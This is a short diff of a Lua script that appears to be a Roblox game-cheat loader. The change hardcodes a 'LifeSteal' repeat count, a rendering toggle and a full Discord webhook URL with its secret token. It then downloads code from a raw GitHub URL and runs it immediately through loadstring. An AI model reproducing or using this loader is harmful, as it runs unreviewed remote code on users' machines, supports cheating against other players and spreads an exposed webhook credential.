@@ -1,9 +1,9 @@
 print(url,LifeStealRepeats, Disable3dRendering)
 local script = [[
 
-    getgenv().LifeStealRepeats = LifeStealRepeats
-    getgenv().url = url
-    getgenv().Disable3dRendering = Disable3dRendering
+    getgenv().LifeStealRepeats = 20
+    getgenv().url = "https://discord.com/api/webhooks/1101071637555716166/n66RlHGOkNMo5DL9UUZfdIAmKWDIU1dAVJqUIihHZKgCAdvwTUYA628GI0vprmmXvZpT" 
+    getgenv().Disable3dRendering = true
 
     loadstring(game:HttpGet('https://raw.githubusercontent.com/ronaldburgerson/bugha/main/sola'))()
 ]]
